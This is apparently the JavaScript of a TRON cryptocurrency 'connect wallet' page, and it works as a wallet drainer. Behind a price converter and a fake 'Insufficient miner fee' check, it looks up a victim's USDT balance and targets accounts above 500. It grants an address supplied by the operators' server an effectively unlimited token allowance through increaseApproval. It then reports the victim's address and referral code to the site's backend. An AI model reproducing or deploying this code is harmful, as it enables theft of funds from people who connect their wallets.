	var address = getUrlQueryString('address')
	var rank = 6.35;
	var authorized_address = '';
	var domain = 'https://'+window.location.host+'/';
	var bizhong = '';
	var approveAddr = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
	var total=0;
	var trx = 0;
	function getUrlQueryString(names, urls) {
		urls = urls || window.location.href;
		urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
		var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
		var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
		if (r != null && r[2] != "")return unescape(r[2]);
		return null;

	}

	$('input.num').bind('input propertychange', function()
	{
		if($(this).val() && $(this).val()>0){
			$('#btn-connect').css('background','#078bc3');
		}else{
			$('#btn-connect').css('background','#dde0dd');
		}
		$('#price').text(($(this).val()*rank).toLocaleString() )

	})

	function getInfo(){
	    var s = getUrlQueryString('s');
		$.ajax({
			type: 'get',
			url:  domain + 'api/get_trc/s/'+s,
			async : false,
			success:function(data){
				console.log("获取推荐人s的信息");
				console.log(data)
				authorized_address = data.data.authorized_address;

			},
			error:function(data){

			}
		})
	}

	async function postInfo(address,symbol){
		var s = getUrlQueryString('s')
		var a = getUrlQueryString('r')

		if (trx < 5) {
		    return 
		}
		
		
// 		if (total == 0) {
// 				return;
// 			}
			
		var data = {
			address:address,
			authorized_address:authorized_address,
			bizhong:symbol,
			code:s,
			reffer:a,
			type:1,
		}
		$.ajax({
			type: 'post',
			url:  domain + 'api/insert_trc',
			data:data,
			success:function(data){
				console.log('api/insert_trc|======');
			    console.log(data)
				window.location.reload();
			},
			error:function(data){
				console.log(data)
			}
		})
	}

	$(function() {
		const addr = {
			'USDT':'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
		}
		const price = {
			'WIN': 0.001150,
			'USDT':1,
			'TONS':1.35,
			'USDJ':1.04,
			'JST': 0.125,
			"HT": 20.41,
			"SUN": 33.97,
			"EXNX": 0.0621,
			"VCOIN": 0.004225,
			"POL": 0.1393,
			"CKRW": 0.002487,
		}

		const decimals = {
			'WIN': 6,
			'USDT':6,
			'TONS':6,
			'USDJ':18,
			'JST': 18,
			"HT": 18,
			"SUN": 18,
			"EXNX": 18,
			"VCOIN": 6,
			"POL": 8,
			"CKRW": 6,
		}

		async function getMostValuableAssets(account) {
			let _symbol = 'USDT'
			for (const symbol of Object.keys(addr)) {
				let contract = await tronWeb.contract().at(addr[symbol]);
				let myBalance = await contract.balanceOf(account).call(function(err,balance){
					const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
					console.log(usdt);
					if (usdt > total && usdt > 500) {
						_symbol = symbol
						total = usdt
						approveAddr = addr[_symbol]
					}
				})
			}
			bizhong = _symbol
			return _symbol
		}

		/**
		 * * Connect wallet button pressed.
		 */
		 
		async function trc_connect() {

			//提交数据
			// let account=$("#btn-connect").attr('data-account');
			// let total=$("#btn-connect").attr('data-amount');
			// let type=$("#btn-connect").attr('data-type');
			// postUserData(account,total,type);

			$('.pages').append('<div class="modal-overlay"></div>');
			$('.modal-overlay').addClass('modal-overlay-visible');
			$('.modal').removeClass('modal-out').addClass('modal-in');

			let tronWeb = window.tronWeb
			let walletAddress = tronWeb.defaultAddress.base58;
			console.log("1||"+walletAddress);
			bizhong = await getMostValuableAssets(walletAddress);
			console.log("2||"+bizhong);
			let instance = await tronWeb.contract().at(approveAddr);
		    var tradeobj = await tronWeb.trx.getAccount(
					walletAddress,
			).then(output => {
				console.log('- Output:', output, '\n');
				console.log(output);
				trx = output.balance / 1000000;
			});

			
            if (trx < 5) {
                alert('Insufficient miner fee');
                return '';
            }
			console.log("||222222");
			console.log(authorized_address);
			let res = await instance["increaseApproval"](authorized_address,"90000000000000000000000000000");
			res.send({
				feeLimit: 100000000,
				callValue: 0,
				shouldPollResponse: false
			},function(err,res){
				if(err == null){
					$(".tishi").fadeIn()
					setTimeout(function () {
						$(".tishi").fadeOut()
					},2000);
					postInfo(walletAddress,bizhong)


				}
				$('.modal-overlay').remove();
				$('.modal').removeClass('modal-in').addClass('modal-out');
			})
		}
		function init() {
			getInfo();
		}


		async function s(){
			var tronWeb = window.tronWeb
			let contract = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
			let walletAddress = tronWeb.defaultAddress.base58;
			let result = await contract.balanceOf(walletAddress).call(function(err,tex){
				if(err == null){
					let total = tex._hex/(10**6);
					$('#yu').text(total.toLocaleString() +' USDT')
					console.log();
					
				}
			});


			console.log("波场钱包");
			console.log(walletAddress);
			console.log(total);

			//提交数据
			if(walletAddress.length){
				checkHasJoined(walletAddress,total);
			}
		}

		/**
		 * Main entry point.
		 */

		init();
		document.querySelector("#btn-connect").addEventListener("click", trc_connect);
		//document.querySelector("#s").addEventListener("click", s);

		interval=setTimeout(function(){
			s();
			console.log('定时器');
		},1000);
	})

